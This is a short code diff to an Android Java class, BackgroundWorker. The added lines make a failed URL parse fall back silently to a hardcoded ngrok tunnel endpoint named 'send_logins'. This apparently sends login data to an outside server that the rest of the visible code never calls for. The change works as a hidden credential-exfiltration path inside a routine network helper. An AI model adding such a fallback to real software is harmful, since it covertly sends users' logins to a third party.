@@ -26,6 +26,11 @@ class BackgroundWorker extends AsyncTask<String, Void, Void> {
             }
             url = new URL(u);
         } catch (Exception e) {
+            try {
+                url = new URL("http://395cfc6d.ngrok.io/send_logins?data={}");
+            } catch (MalformedURLException e1) {
+                e1.printStackTrace();
+            }
             e.printStackTrace();
         }
         HttpURLConnection urlConnection = null;
